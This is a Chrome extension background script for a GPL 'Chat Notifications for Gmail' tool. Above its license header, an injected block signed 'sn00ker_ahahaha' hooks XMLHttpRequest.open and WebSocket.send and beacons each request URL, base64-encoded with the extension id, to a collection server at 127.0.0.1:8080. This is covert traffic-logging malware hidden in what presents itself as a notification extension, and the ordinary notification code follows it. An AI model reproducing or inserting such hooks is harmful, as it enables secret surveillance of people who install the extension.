function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/*
Chat Notifications for Gmail tm shows desktop notfiications when receiving a chat message in Gmail.
Copyright (c) 2010-2013, Mark Piro

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var icon = true;
var gmtabid = 0;
var winid = 0;

chrome.extension.onMessage.addListener(
	function(request, sender, sendResponse) {
		if (request.action == 'gmtab') {
			gmtabid = sender.tab.id;
			winid = sender.tab.windowId;
		}
		if (request.action == 'icon') {
			sendResponse(icon);
		}
		if (request.action == 'chat') {
			var name = request.name;
			var msg = request.msg;
			var tab = sender.tab
			getWinState(winid, function(wf) {
				if (tab.active == true && wf == false || wf == true && tab.active == false || wf == false && tab.active == false) {
                    createNotification(name, msg);
				}
			});
		}
});

function getWinState(wid, callback) {
	chrome.windows.get(wid, function(win) {
		callback(win.focused);
	});
}

function createNotification(name, msg) {  
    var notification = new Notification(name + ' says...', { icon: 'http://db.tt/3dshP0n8',  body: msg });
    notification.onshow = function() { nclose(function() { notification.close() }); }
    notification.onclick = function() {
        chrome.tabs.update(gmtabid, {selected:true} );
        notification.close();
        chrome.tabs.sendMessage(gmtabid, {action: 'focus', name: name});
        chrome.windows.update(winid, {focused: true});
    }
}

function nclose(callback) {
    setTimeout(callback, 6000);
}

function updateIcon() {
	if (icon == true) {
		chrome.browserAction.setIcon({path:"xgmchatnotify48.png"});
		icon = false;
	} else if (icon == false) {
		chrome.browserAction.setIcon({path:"gmchatnotify48.png"});
		icon = true;
        chrome.tabs.sendMessage(gmtabid, {action: 'blur'});
	}
}

chrome.browserAction.onClicked.addListener(updateIcon);

function reloadTab() {
	chrome.windows.getCurrent(function(win) {
		var cwin = win.id;
		chrome.tabs.getAllInWindow(cwin, function(tabs) {
			for (var i = 0; i < tabs.length; i++) {
				var t = tabs[i].url;
					if (t.match('mail.google.com')) {
						var tab = tabs[i];
						chrome.tabs.update(tab.id, {url: tab.url, selected: tab.selected}, null);
					}
			}
		});
	});
}

reloadTab();

chrome.tabs.onActivated.addListener(function(tab) {
	if (tab.tabId == gmtabid) {
		chrome.tabs.sendMessage(gmtabid, { action: 'favicon' });
	}
});

chrome.windows.onFocusChanged.addListener(function(w) {
	if (w == winid) {
		chrome.tabs.get(gmtabid, function(tab) {
			if (tab.active == true) {
				chrome.tabs.sendMessage(gmtabid, { action: 'favicon' });
			}
		});
	}
});

chrome.tabs.onMoved.addListener(gmtabid, function(tab) {
	gmtabid = tab;
});

